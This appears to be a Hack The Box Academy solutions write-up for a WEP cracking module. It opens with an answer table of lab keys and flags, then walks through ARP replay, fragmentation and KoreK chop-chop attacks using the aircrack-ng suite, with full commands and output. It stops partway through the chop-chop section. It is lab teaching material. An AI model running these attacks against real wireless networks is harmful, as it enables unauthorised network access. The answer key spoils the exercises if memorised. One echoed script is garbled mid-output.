
| Section | Question Number | Answer |
| --- | --- | --- |
| Seed Generation and the RC4 Algorithm | Question 1 | DONE |
| CRC32 Generation (WEP's ICV Algorithm) | Question 1 | 254452502 |
| Putting Together the Algorithms | Question 1 | 2780581187 |
| Finding the Initialization Vector with Wireshark | Question 1 | 0xff0100 |
| ARP Request Replay Attack | Question 1 | 12:34:51:23:45 |
| Fragmentation Attack | Question 1 | 2B:51:5A:7E:F4 |
| KoreK Chop Chop Attack | Question 1 | 1A:64:8C:9F:E2 |
| The Cafe Latte Attack | Question 1 | 1A:2B:3C:4D:5E |
| Additional WEP Cracking | Question 1 | AE:5B:7F:3A:03:D0:AF:9B:F6:8D:A5:E2:C7 |
| Additional WEP Cracking | Question 2 | xampp |
| Wired Equivalent Privacy Attacks - Skills Assessment | Question 1 | PixelForge |
| Wired Equivalent Privacy Attacks - Skills Assessment | Question 2 | 1B:2A:5A:4C:6A |
| Wired Equivalent Privacy Attacks - Skills Assessment | Question 3 | 4c48e724be394b5ab14e776b2af08193 |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# CRC32 Generation (WEP's ICV Algorithm)

## Question 1

### "Examine the script shown in the section. After changing the plaintext to HackTheBox, what is the outputted value of the CRC32?"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-vfz5ftds33]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.119 /u:wifi /p:wifi /dynamic-resolution 

[06:23:48:125] [5187:5188] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:23:48:426] [5187:5188] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:23:48:426] [5187:5188] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:23:48:442] [5187:5188] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:23:48:442] [5187:5188] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:23:48:442] [5187:5188] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use the Python script provided in the section while changing the value in the `packetplaintext` variable to `HackTheBox`:

Code: shell

```shell
cat << EOF > crc32s.py
import zlib

# First we declare our packet plaintext. In normal communications this is the actual plaintext data.
packetplaintext = b'HackTheBox'

# We then use the zlib library to calculate the CRC32.
crc32 = zlib.crc32(packetplaintext)

print(crc32)
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > crc32s.py
import zlib

# First we declare our packet plaintext. In normal communications this is the actual plaintext data.
packetplaintext = b'HackTheBox'

# We then use the zlib library to calculate the CRC32.
crc32 = zlib.crc32(packetplaintext)

print(crc32)
EOF
```

Students will execute the `crc32s.py` Python script and obtain the value of the CRC32:

Code: shell

```shell
python3 crc32s.py
```

```
wifi@WiFiIntro:~$ python3 crc32s.py 

{hidden}
```

Answer: `254452502`

# Putting Together the Algorithms

## Question 1

### "Run the script shown in the section and change the plaintext to HackTheWifi. What is the output value of the CRC32 Checksum?"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-xftldvqhov]─[~]
└──╼ [★]$ xfreerdp /v:10.129.166.84 /u:wifi /p:wifi /dynamic-resolution 

[06:42:36:396] [13194:13195] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:42:36:697] [13194:13195] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:42:36:697] [13194:13195] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:42:36:713] [13194:13195] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:42:36:713] [13194:13195] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:42:36:714] [13194:13195] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use the Python script provided in the section while changing the value in the `packetplaintext` variable to `HackTheWifi`:

Code: shell

```shell
cat << EOF > mockciphers.py
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import binascii
import zlib

# First we declare our packet plain text, this is the unencrypted message that we need to pass through our mock WEP algorithm
packetplaintext = b'HackTheWifi'

# Then we calculate the CRC32 checksum (32-bit integer) of our packet plain text
crc32 = zlib.crc32(packetplaintext)

# Generating the 24-bit Initialization Vector (3 bytes)
IV = get_random_bytes(3)

# Declaring our 40-bit key (5 bytes) and 64-bit seed (8 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key 

# Declaring our 104-bit key (13 bytes) and 128-bit seed
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104 

# Generating the keystreams
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# Constructing our ICV Message
crc32byte = crc32.to_bytes(4, 'big')  # Convert CRC32 checksum from integer to bytes
ICVMessage = packetplaintext + crc32byte # Concatenate the packet plaintext and CRC32 checksum

# Final Ciphertext, made by XORing the ICV Message and keystream
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage) 

# Final Message, formed by concatenating the Initialization Vector with the Final Cipher Text
finalmsg = IV + msg
finalmsgb = IV + msgB

print('-------------')
print('CRC32 Checksum: ' + str(crc32))
print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))
print('-------------')
print('ICV Message: ' + str(ICVMessage))
print('Cipher Text 64-bit Seed: ' + str(msg))
print('Cipher Text 128-bit Seed: ' + str(msgB))
print('-------------')
print('Final Message 64-bit Seed: ' + str(finalmsg))
print('Final Message 128-bit Seed: ' + str(finalmsgb))
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > mockciphers.py
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import binascii
import zlib

# First we declare our packet plain text, this is the unencrypted message that we need to pass through our mock WEP algorithm
packetplaintext = b'HackTheWifi'

# Then we calculate the CRC32 checksum (32-bit integer) of our packet plain text
crc32 = zlib.crc32(packetplaintext)

# Generating the 24-bit Initialization Vector (3 bytes)
IV = get_random_bytes(3)

# Declaring our 40-bit key (5 bytes) and 64-bit seed (8 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key 

# Declaring our 104-bit key (13 bytes) and 128-bit seed
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104 

# Generating the keystreams
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# Constructing our ICV Message
crc32byte = crc32.to_bytes(4, 'big')  # Convert CRC32 checksum from integer to bytes
ICVMessage = packetplaintext + crc32byte # Concatenate the packet plaintext and CRC32 checksum

# Final Ciphertext, made by XORing the ICV Message and keystream
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage) 

# Final Message, formed by concatenating the Initialization Vector with the Final Cipher Text
finalmsg = IV + msg
finalmsgb = IV + msgB

print('-------------')
print('CRC32 Checksum: ' + str(crc32))
print('Initialization Vector: ' + str(IV))
EOFnt('Final Message 128-bit Seed: ' + str(finalmsgb))
```

Students will execute the `mockciphers.py` Python script and obtain the value of the CRC32 checksum:

Code: shell

```shell
python3 mockciphers.py
```

```
wifi@WiFiIntro:~$ python3 mockciphers.py 

-------------
CRC32 Checksum: {hidden}
Initialization Vector: b'\xfe\x86\xf8'
64-bit Seed: b'\xfe\x86\xf8\x01\x02\x03\x04\x05'
128-bit Seed: b'\xfe\x86\xf8\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r'
-------------
ICV Message: b'HackTheWifi\xa5\xbcMC'
Cipher Text 64-bit Seed: b'\t\xbfYk\xe4\xcd\x9e\x81\xcc\xcd/\x06\xc0d\xb3'
Cipher Text 128-bit Seed: b'\x84\xdc\xc7\x857.\x12Z5\\\xa3D0\xc5\x10'
-------------
Final Message 64-bit Seed: b'\xfe\x86\xf8\t\xbfYk\xe4\xcd\x9e\x81\xcc\xcd/\x06\xc0d\xb3'
Final Message 128-bit Seed: b'\xfe\x86\xf8\x84\xdc\xc7\x857.\x12Z5\\\xa3D0\xc5\x10'
```

Answer: `2780581187`

# Finding the Initialization Vector with Wireshark

## Question 1

### "Use Wireshark to open the file /opt/IV-Wireshark.pcap and locate the Initialization Vectors (IVs). What is the IV for packet number 14?"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-xftldvqhov]─[~]
└──╼ [★]$ xfreerdp /v:10.129.184.228 /u:wifi /p:wifi /dynamic-resolution 

[07:09:06:279] [53954:53955] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[07:09:06:580] [53954:53955] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:09:06:580] [53954:53955] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:09:06:602] [53954:53955] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:09:06:602] [53954:53955] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:09:06:602] [53954:53955] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `Wireshark` to open the `IV-Wireshark.pcap` packet capture file located in the `/opt` directory:

Code: shell

```shell
wireshark /opt/IV-Wireshark.pcap
```

```
wifi@WiFiIntro:~$ wireshark /opt/IV-Wireshark.pcap
```

Within `Wireshark`, students will select the fourteenth packet and expand the `IEEE 802.11 Data...` section and the `WEP Parameters` section to find the value of the `Initialization Vector`:

![[HTB Solutions/Others/z. images/30840c3cf02b8bd3fb7b90b76d3ab5a4_MD5.jpg]]

Answer: `0xff0100`

# ARP Request Replay Attack

## Question 1

### "Perform the ARP Request Replay attack on the WiFi network. What is the WEP KEY for this network? (Format: xx:xx:xx:xx:xx)"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-xftldvqhov]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.119 /u:wifi /p:wifi /dynamic-resolution 

[07:29:51:969] [85950:85951] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[07:29:53:672] [85950:85951] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:29:53:672] [85950:85951] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:29:53:691] [85950:85951] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:29:53:691] [85950:85951] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:29:53:691] [85950:85951] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    206 wpa_supplicant
    209 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Students will use `airodump-ng` to capture the traffic on channel one and save it to a file named `Student`:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -c 1 -w Student

06:08:07  Created capture file "Student-01.cap".

CH  1 ][ Elapsed: 36 s ][ 2024-11-26 06:08 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47   0      401       17    0   1   11   WEP  WEP         CyberNet-Secure                               

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  0E:D1:22:CF:ED:67  -29    2 - 1      0       15
```

Students will open a new terminal and use `aireplay-ng` to replay the packets using the BSSID found in `airodump-ng` and the client MAC address from the `STATION` column, respectively. Note the MAC addresses may change upon target spawn or reset.

Code: shell

```shell
sudo aireplay-ng -3 -b D8:D6:3D:EB:29:D5 -h 0E:D1:22:CF:ED:67 wlan0mon
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -3 -b D8:D6:3D:EB:29:D5 -h 0E:D1:22:CF:ED:67 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 0E:D1:22:CF:ED:67
06:11:23  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
Saving ARP requests in replay_arp-1126-061123.cap
You should also start airodump-ng to capture replies.

190123 packets (got 63520 ARP requests and 0 ACKs), sent 62915 packets...(500 pps)
```

After a moment, students will terminate both processes (`airodump-ng` and `aireplay-ng`) with the key combination of `CTRL + C`. Subsequently, students will use `aircrack-ng` using the BSSID of the target found through `airodump-ng` with the packet capture `Student-01.cap` to retrieve the key:

Code: shell

```shell
aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap
```

```
wifi@WiFiIntro:~$ aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap

Reading packets, please wait...
Opening Student-01.cap
Read 251741 packets.

1 potential targets      Got 125900 out of 125000 IVsStarting PTW attack with 125900 ivs.
                     KEY FOUND! [ {hidden} ] 
	Decrypted correctly: 100%
```

Answer: `12:34:51:23:45`

# Fragmentation Attack

## Question 1

### "Perform the Fragmentation attack on the WiFi network. What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-i1jo3nbz6k]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.120 /u:wifi /p:wifi /dynamic-resolution 

[00:54:52:680] [88845:88846] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[00:54:53:981] [88845:88846] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:54:53:981] [88845:88846] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:54:53:994] [88845:88846] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:54:53:994] [88845:88846] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:54:53:994] [88845:88846] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    206 wpa_supplicant
    209 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Students will use `airodump-ng` to capture the traffic on channel one and save it to a file named `Student`:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -c 1 -w Student

 CH  1 ][ Elapsed: 1 min ][ 2024-11-26 07:13 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47 100      602        0    0   1   11   WEP  WEP         HackTheBox-Wireless                            

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  32:74:0B:88:CC:93  -29    0 - 1      0        3         HackTheBox-Wireless 
```

Students will open a new terminal and use `aireplay-ng` to perform a fragmentation attack targeting the MAC addresses found in the `BSSID` and `STATION` columns in the `airodump-ng` output, respectively. Once a packet is found, students will use that packet. Note the MAC addresses may change upon target spawn or reset:

Code: shell

```shell
sudo aireplay-ng -5 -b D8:D6:3D:EB:29:D5 -h 32:74:0B:88:CC:93 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -5 -b D8:D6:3D:EB:29:D5 -h 32:74:0B:88:CC:93 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 32:74:0B:88:CC:93
07:17:13  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
07:17:13  Waiting for a data packet...
Read 211 packets...

        Size: 40, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  D8:D6:3D:EB:29:D5
          Dest. MAC  =  D8:D6:3D:EB:29:D5
         Source MAC  =  32:74:0B:88:CC:93

        0x0000:  0841 0201 d8d6 3deb 29d5 3274 0b88 cc93  .A....=.).2t....
        0x0010:  d8d6 3deb 29d5 5011 f2d1 1500 d9e5 2fdb  ..=.).P......./.
        0x0020:  2975 adbd ab82 a20b                      )u......

Use this packet ? y

Saving chosen packet in replay_src-1126-071735.cap
07:18:17  Data packet found!
07:18:17  Sending fragmented packet
07:18:19  No answer, repeating...
07:18:19  Trying a LLC NULL packet
07:18:19  Sending fragmented packet
07:18:19  Got RELAYED packet!!
07:18:19  Trying to get 384 bytes of a keystream
07:18:19  Got RELAYED packet!!
07:18:19  Trying to get 1500 bytes of a keystream
07:18:19  Got RELAYED packet!!
Saving keystream in fragment-1126-071819.xor
Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
```

Next, students will use `tcpdump` to identify the source and IP destination addresses using the packet capture saved with a unique name from `aireplay-ng`. Note that the IP addresses may not be obtained due to the nature of the attack.

Code: shell

```shell
tcpdump -s 0 -e -r replay_src-1126-071735.cap
```

```
wifi@WiFiIntro:~$ tcpdump -s 0 -e -r replay_src-1126-071735.cap

reading from file replay_src-1126-071735.cap, link-type IEEE802_11 (802.11), snapshot length 65535
07:17:35.759397 BSSID:d8:d6:3d:eb:29:d5 (oui Unknown) SA:32:74:0b:88:cc:93 (oui Unknown) DA:d8:d6:3d:eb:29:d5 (oui Unknown) Data IV:15d1f2 Pad 0 KeyID 0
```

Students will proceed to forge an ARP request with `packetforge-ng` using the previously captured keystream as a `.xor` file, specifying the access point's MAC address and the MAC address of the connected client while choosing the `255.255.255.255` IP addresses for both, designating them as broadcast addresses:

Code: shell

```shell
packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h 32:74:0B:88:CC:93 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1126-071819.xor -w student-forgedarp.cap
```

```
wifi@WiFiIntro:~$ packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h 32:74:0B:88:CC:93 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1126-071819.xor -w student-forgedarp.cap

Wrote packet to: student-forgedarp.cap
```

Next, students will use `aireplay-ng` in an interactive replay mode (`-2`) while specifying the forged packet and the MAC address of the connected client and use this packet:

Code: shell

```shell
sudo aireplay-ng -2 -r student-forgedarp.cap -h 32:74:0B:88:CC:93 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -2 -r student-forgedarp.cap -h 32:74:0B:88:CC:93 wlan0mon
The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 32:74:0B:88:CC:93

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  D8:D6:3D:EB:29:D5
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  32:74:0B:88:CC:93

        0x0000:  0841 0201 d8d6 3deb 29d5 3274 0b88 cc93  .A....=.).2t....
        0x0010:  ffff ffff ffff 8001 936f 0800 b86c 1372  .........o...l.r
        0x0020:  f9e2 ee7c d399 03d1 8b95 a6fb 51a7 d675  ...|........Q..u
        0x0030:  7b92 c766 4b32 d46d 5ddf 367b ddb3 4344  {..fK2.m].6{..CD
        0x0040:  3acd 97fc                                :...

Use this packet ? y

Saving chosen packet in replay_src-1126-072532.cap
You should also start airodump-ng to capture replies.

Sent 80000 packets...(499 pps)
```

After a while, students will terminate both processes (`airplay-ng` and `airodump-ng`) with the key combination of `CTRL + C`. Subsequently, they will use `aircrack-ng` along with the access point's MAC address and the packet capture `Student-01.cap` to retrieve the key:

Code: shell

```shell
aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap
```

```
wifi@WiFiIntro:~$ aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap

Reading packets, please wait...
Opening Student-01.cap
Read 241092 packets.

1 potential targets                              Got 80317 out of 80000 IVsStarting PTW attack with 80317 ivs.
                     KEY FOUND! [ {hidden} ] 
Attack wDecrypted correctly: 100%00 captured ivs.
```

Answer: `2B:51:5A:7E:F4`

# Korek Chop Chop Attack

## Question 1

### "Perform the Korek Chop Chop attack on the WiFi network. What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.62]─[htb-ac-8414@htb-arbj7vt9or]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.131 /u:wifi /p:wifi /dynamic-resolution 

[02:02:42:399] [16262:16263] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:02:43:700] [16262:16263] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:02:43:700] [16262:16263] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:02:43:715] [16262:16263] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:02:43:715] [16262:16263] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:02:43:715] [16262:16263] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    206 wpa_supplicant
    209 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Students will use `airodump-ng` to capture the traffic on channel one and save it to a file named `Student`:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -c 1 -w Student

06:56:30  Created capture file "Student-01.cap".

CH  1 ][ Elapsed: 18 s ][ 2024-11-27 06:56 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47 100      212        0    0   1   11   WEP  WEP         Virt-Corp                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  DA:F5:D5:63:BB:E1  -29    0 - 1      0        1         Virt-Corp 
```

Students will open a new terminal and use `aireplay-ng` to perform a KoreK chop chop attack targeting the MAC addresses found in the `BSSID` and `STATION` columns in the `airodump-ng` output, respectively. Once a packet is found, students will use that packet. Note the MAC addresses may change upon target spawn or reset:

Code: shell

```shell
sudo aireplay-ng -4 -b D8:D6:3D:EB:29:D5 -h DA:F5:D5:63:BB:E1 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -4 -b D8:D6:3D:EB:29:D5 -h DA:F5:D5:63:BB:E1 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether DA:F5:D5:63:BB:E1
07:09:07  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1

        Size: 100, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  D8:D6:3D:EB:29:D5
          Dest. MAC  =  D8:D6:3D:EB:29:D5
         Source MAC  =  DA:F5:D5:63:BB:E1

        0x0000:  0841 0201 d8d6 3deb 29d5 daf5 d563 bbe1  .A....=.)....c..
        0x0010:  d8d6 3deb 29d5 4010 d148 1d00 4ae4 569e  ..=.).@..H..J.V.
        0x0020:  6108 ecb6 524c 997e 856c 9694 effb 2b91  a...RL.~.l....+.
        0x0030:  d739 2b60 2b9e d4c6 c31c dec4 a0c0 e03f  .9+\`+..........?
        0x0040:  dab9 99ee e209 838d 95a6 a241 666a 4a62  ...........AfjJb
        0x0050:  7399 b366 6c1c 7619 a79c b97f 98b4 54b5  s..fl.v......T.
        0x0060:  4c91 bf88                                L...

Use this packet ? y

<SNIP>

Offset   44 (83% done) | xor = AF | pt = 40 |   70 frames written in  1191ms
Offset   43 (84% done) | xor = 94 | pt = 00 |  124 frames written in  2113ms
Offset   42 (86% done) | xor = D6 | pt = 40 |   38 frames written in   653ms
Offset   41 (87% done) | xor = 12 | pt = 7E |   97 frames written in  1645ms
Offset   40 (89% done) | xor = BB | pt = 3E |   20 frames written in   339ms
Sent 902 packets, current guess: 82...

The AP appears to drop packets shorter than 40 bytes.
Enabling standard workaround:  IP header re-creation.

Saving plaintext in replay_dec-1127-071138.cap
Saving keystream in replay_dec-1127-071138.xor

Completed in 135s (0.46 bytes/s)
```

Students will use `tcpdump` to recover both the IPs of the client and the access point within the packet capture generated by `aireplay-ng` within the `replay_dec-` files:

Code: shell

```shell
tcpdump -s 0 -n -e -r replay_dec-1127-071138.cap
```

```
wifi@WiFiIntro:~$ tcpdump -s 0 -n -e -r replay_dec-1127-071138.cap

reading from file replay_dec-1127-071138.cap, link-type IEEE802_11 (802.11), snapshot length 65535
07:11:38.135585 BSSID:d8:d6:3d:eb:29:d5 SA:da:f5:d5:63:bb:e1 DA:d8:d6:3d:eb:29:d5 LLC, dsap SNAP (0xaa) Individual, ssap SNAP (0xaa) Command, ctrl 0x03: oui Ethernet (0x000000), ethertype IPv4 (0x0800), length 60: 192.168.1.75.42412 > 192.168.1.1.443: Flags [S], seq 529474759, win 64240, options [mss 1460,sackOK,TS val 1030732529 ecr 0,nop,wscale 7], length 0
```

Next, they will use `packetforge-ng` to forge an ARP request using the previously obtained MAC addresses of the access point (`-a`) and the client (`-h`), alongside the IPs of the access point (`192.168.1.1`) and the client (`192.168.1.75`), respectively, and save the forged ARP request into a file:

Code: shell

```shell
packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h DA:F5:D5:63:BB:E1 -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-1127-071138.xor -w student-forgedarp.cap
```

```
wifi@WiFiIntro:~$ packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h DA:F5:D5:63:BB:E1 -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-1127-071138.xor -w student-forgedarp.cap

Wrote packet to: student-forgedarp.cap
```

Students will use `aireplay-ng` in packet replay mode, specifying the forged ARP packet and the MAC address of the client connected to the access point:

Code: shell

```shell
sudo aireplay-ng -2 -r student-forgedarp.cap -h DA:F5:D5:63:BB:E1 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -2 -r student-forgedarp.cap -h DA:F5:D5:63:BB:E1 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether DA:F5:D5:63:BB:E1

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  D8:D6:3D:EB:29:D5
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  DA:F5:D5:63:BB:E1

        0x0000:  0841 0201 d8d6 3deb 29d5 daf5 d563 bbe1  .A....=.)....c..
